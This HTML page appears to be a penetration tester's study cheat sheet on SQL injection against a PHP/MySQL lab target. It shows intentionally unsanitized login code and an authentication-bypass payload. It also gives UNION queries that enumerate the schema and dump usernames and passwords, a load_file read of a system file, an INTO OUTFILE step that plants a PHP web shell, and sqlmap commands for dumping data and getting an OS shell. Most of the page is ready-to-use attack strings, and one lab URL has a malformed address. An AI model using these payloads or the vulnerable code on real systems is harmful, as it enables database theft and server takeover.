<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SQL Injection</title>
</head><body><b>Web Application Attacks - SQL Injection<br/>
<br/>
</b><b>Info</b>: <br/>
Found in dynamic sites that is caused by unsantized user input which is then passed on to a database. <br/>
Can lead to data leakage and complete server compromise. <br/>
<br/>
<br/>
<b>PHP/MYSQL environment SQL Injection Attacks<br/>
<br/>
Authentication Bypass<br/>
<br/>
</b><b>Admin page code:</b>&nbsp;<br/>
<br/>
mysql_select_db('webappdb');<ul><b><i><li style="list-style-type: none">$user = $_POST['user']; // unsanitized</li>
</i></b><li style="list-style-type: none"><b><i>$pass = $_POST['pass']; // unsanitized</i></b></li>
<li style="list-style-type: none"><b><i>$query="select * from users where name = '$user' and password = '$pass' "; </i></b></li>
<li style="list-style-type: none">$queryN = mysql_query($query) or die(mysql_error());</li>
<li style="list-style-type: none">if (mysql_num_rows($queryN) == 1)</li>
<li style="list-style-type: none">{&#09;$resultN = mysql_fetch_assoc($queryN);</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">$_SESSION['user'] = $_POST['user']; </li>
<li style="list-style-type: none">header("location:admin.php");</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none">else // user rejected</li>
<li style="list-style-type: none">{&#09;echo "&lt;br /&gt;&lt;h1&gt;Wrong Username or Password&lt;/h1&gt;";</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">echo '&lt;META HTTP-EQUIV="Refresh" CONTENT="2;URL=admin.php"&gt;'; </li>
</ul>
</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none"></li>
</ul>
Note: $user and $pass POST variables are not sanitized in any way and are then used as part of an SQL statment. <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
<b>Log in to MYSQL database on the machine it is running on <br/>
<br/>
</b>C:\xampp\mysql\bin&gt;mysql -u root -p <br/>
mysql&gt; use webappdb<b><br/>
</b><b><br/>
<br/>
Query Users:<br/>
<br/>
</b>mysql&gt; select * from users; <br/>
mysql&gt; select * from users where name='wronguser' and password='wrongpass'; Empty set (0.00 sec)<br/>
mysql&gt; select * from users where name='offsec' and password='123456';<br/>
<br/>
<br/>
<b>Query Users with malicious input</b><br/>
<br/>
mysql&gt; select * from users where name='wronguser' or 1=1;# and password='wrongpass';<br/>
mysql&gt; select * from users where name='wronguser' or 1=1 LIMIT 1;# and password='wrongpass';<br/>
<br/>
<b>Note</b>: These queries can be executed by the client simply by enterring 'wronguser' or 1=1;# &nbsp;to the username field and 'wrongpass' to the password field. <br/>
<br/>
<br/>
<br/>
<br/>
<b>Testing for an Error, Enumerating The Database &amp; Understanding the Structure<br/>
<br/>
</b><b>Test</b>: add the symbol ' or " to a query parameter. If this causes an error, an enumeration attack is possible. <br/>
<br/>
<b>Coloumn number enumeration: </b><br/>
<br/>
<b>Info:</b>&nbsp;Depending on the verbosity of the error, the 'order by' output query can be used to gather information on the database structure<br/>
<b><br/>
</b><b>Command</b>: http://10.11.1.35/comment.php?id=738 order by 1<br/>
<b>Note</b>: Keep increasing the value till an error occurs. The previous value will give you the number of columns in the current table. <br/>
<b><br/>
</b><b>Command:</b>&nbsp;http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,5,6<br/>
<b>Note:</b>&nbsp;The number of values in the command has to equal the number of columns in the table<br/>
<br/>
<b><br/>
<br/>
</b><b>Extracting Data from the Database</b><br/>
<br/>
<b>Discover the version of MYSQL:</b>&nbsp;http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,@@version,6<br/>
<br/>
<b>Discover the current user: </b>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,user(),6<br/>
<br/>
<b>Discover the tables in the database: </b>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables<br/>
<br/>
<b>Discover the columns in the user table: </b>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'<br/>
<br/>
<b>Discover the name and password values from the users table: </b>http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users<br/>
<br/>
<br/>
<br/>
<b>Code Execution:<br/>
<br/>
</b><b>Read from file (load_file): </b>http://192.168/13/33/comment.php?id=-1 union select all 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6<br/>
<br/>
<b>Create file (OUTFILE): </b>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'<br/>
<b>Navigate to the file created:</b>&nbsp;http://10.11.1.35/backdoor.php?cmd=ipconfig<br/>
<br/>
<br/>
<br/>
<b>Automated (SQLMap)<br/>
<br/>
</b><b>Info: </b>Identify and exploit SQL injection vulnerabilities. <br/>
<br/>
<b>Enumerate and search for SQL injection vulnerabilities: </b>root@kali:~# sqlmap -u http://10.11.1.35 --crawl=1<br/>
<br/>
<b>Extract data from Database:</b>&nbsp;root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --dump -- threads=5<br/>
<br/>
<b>Get Shell: </b>root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell<br/>
<br/>
<br/>
</body></html>